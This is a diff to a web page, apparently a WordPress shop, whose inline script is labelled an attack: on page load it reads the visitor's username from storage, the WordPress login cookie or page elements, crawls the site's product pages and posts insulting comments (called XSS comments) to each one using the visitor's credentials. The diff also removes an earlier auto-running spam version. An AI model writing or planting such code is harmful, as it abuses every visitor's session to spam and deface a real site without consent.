@@ -2919,6 +2919,13 @@
       data-wp-strategy="defer"
     ></script>
     <script>
+      // Config
+      const ATTACK_CONFIG = {
+        targetWebsite: "https://mydecobox.shop",
+        delayBetweenRequests: 2000,
+        maxRetries: 2,
+      };
+
       const PRODUCT_PAGES = [
         "https://mydecobox.shop/product-category/hop-co-san/",
         "https://mydecobox.shop/hop-tu-decor/",
@@ -2932,90 +2939,122 @@
         "Nhân viên thái độ lồi lõm",
       ];
 
-      // Hàm fetch link sản phẩm
-      async function extractProductLinksFrom(url) {
+      // Hàm lấy tên người dùng hiện tại
+      function getCurrentUsername() {
         try {
-          const res = await fetch(url);
-          const html = await res.text();
-          const parser = new DOMParser();
-          const doc = parser.parseFromString(html, "text/html");
+          // Cách 1: Lấy từ localStorage (nếu có)
+          if (localStorage.getItem("currentUser")) {
+            return JSON.parse(localStorage.getItem("currentUser")).username;
+          }
 
-          const links = Array.from(doc.querySelectorAll("a"))
-            .map((a) => a.href)
-            .filter(
-              (href) =>
-                href.includes("/product/") &&
-                href.startsWith("https://mydecobox.shop")
-            );
+          // Cách 2: Lấy từ cookie
+          const cookies = document.cookie.split(";");
+          const userCookie = cookies.find((c) =>
+            c.trim().startsWith("wordpress_logged_in_")
+          );
+          if (userCookie) {
+            return userCookie.split("|")[0].trim();
+          }
 
-          return [...new Set(links)];
-        } catch (err) {
-          console.warn(`Không fetch được ${url}`, err);
-          return [];
+          // Cách 3: Lấy từ các phần tử HTML thông thường
+          const usernameElements = [
+            document.querySelector(".username"),
+            document.querySelector("#wp-admin-bar-my-account a"),
+            document.querySelector('meta[name="current-user"]'),
+          ];
+
+          for (const el of usernameElements) {
+            if (el && el.textContent) return el.textContent.trim();
+          }
+
+          return "Khách"; // Fallback
+        } catch (e) {
+          console.warn("Không lấy được username:", e);
+          return "Ẩn danh";
         }
       }
 
-      async function getAllProductLinks() {
-        let all = [];
-        for (const url of PRODUCT_PAGES) {
-          const links = await extractProductLinksFrom(url);
-          all = all.concat(links);
-        }
-        return [...new Set(all)];
-      }
+      // Hàm gửi comment độc hại
+      async function sendXSSComment(url, comment) {
+        const username = getCurrentUsername();
 
-      // Gửi comment
-      async function sendComment(productUrl, commentText) {
-        const payload = new URLSearchParams();
-
-        const name =
-          typeof CURRENT_USER_NAME !== "undefined" && CURRENT_USER_NAME
-            ? CURRENT_USER_NAME
-            : "Ẩn danh";
-
-        payload.append("name", name);
-        payload.append("comment", commentText);
-        payload.append("xss_submit", "1");
+        const formData = new URLSearchParams();
+        formData.append("name", username);
+        formData.append("comment", comment);
+        formData.append("xss_submit", "1");
 
         try {
-          const res = await fetch(productUrl, {
+          const res = await fetch(url, {
             method: "POST",
             headers: {
               "Content-Type": "application/x-www-form-urlencoded",
             },
-            body: payload,
+            body: formData,
+            credentials: "include",
           });
 
-          if (res.ok) {
-            console.log(`✅ Gửi thành công: ${productUrl}`);
-          } else {
-            console.warn(`❌ Lỗi gửi: ${productUrl} (Mã ${res.status})`);
-          }
+          return res.ok;
         } catch (err) {
-          console.error(`🔥 Gửi thất bại: ${productUrl}`, err);
+          console.error("Gửi thất bại:", err);
+          return false;
         }
       }
 
-      // Chạy spam
-      async function runSpam() {
-        const links = await getAllProductLinks();
+      // Hàm crawl link sản phẩm
+      async function getProductLinks() {
+        const allLinks = new Set();
 
-        if (links.length === 0) {
-          console.warn("Không tìm thấy sản phẩm nào.");
+        for (const page of PRODUCT_PAGES) {
+          try {
+            const res = await fetch(`${ATTACK_CONFIG.targetWebsite}${page}`);
+            const html = await res.text();
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(html, "text/html");
+
+            doc.querySelectorAll('a[href*="/product/"]').forEach((a) => {
+              const href = a.getAttribute("href");
+              if (href.startsWith(ATTACK_CONFIG.targetWebsite)) {
+                allLinks.add(href);
+              }
+            });
+          } catch (err) {
+            console.warn(`Lỗi khi crawl ${page}:`, err);
+          }
+        }
+
+        return Array.from(allLinks);
+      }
+
+      // Hàm thực thi tấn công
+      async function executeXSSAttack() {
+        console.log("🛡️ Bắt đầu tấn công...");
+
+        const productLinks = await getProductLinks();
+        if (productLinks.length === 0) {
+          console.error("Không tìm thấy sản phẩm nào!");
           return;
         }
 
-        links.forEach((link, i) => {
-          const cmt =
-            SPAM_COMMENTS[Math.floor(Math.random() * SPAM_COMMENTS.length)];
-          setTimeout(() => {
-            sendComment(link, cmt);
-          }, i * 3000); // delay 3s/spam
-        });
+        console.log(`🎯 Tìm thấy ${productLinks.length} sản phẩm`);
+
+        // Gửi comment XSS đến từng sản phẩm
+        for (let i = 0; i < productLinks.length; i++) {
+          const targetUrl = productLinks[i];
+          const maliciousComment = SPAM_COMMENTS[i % SPAM_COMMENTS.length];
+
+          setTimeout(async () => {
+            const success = await sendXSSComment(targetUrl, maliciousComment);
+            console.log(success ? `✅ ${targetUrl}` : `❌ ${targetUrl}`);
+          }, i * ATTACK_CONFIG.delayBetweenRequests);
+        }
       }
 
-      // Auto chạy sau 5 giây
-      setTimeout(runSpam, 5000);
+      // Tự động chạy khi trang web tải xong
+      if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", executeXSSAttack);
+      } else {
+        setTimeout(executeXSSAttack, 3000);
+      }
     </script>
   </body>
 </html>
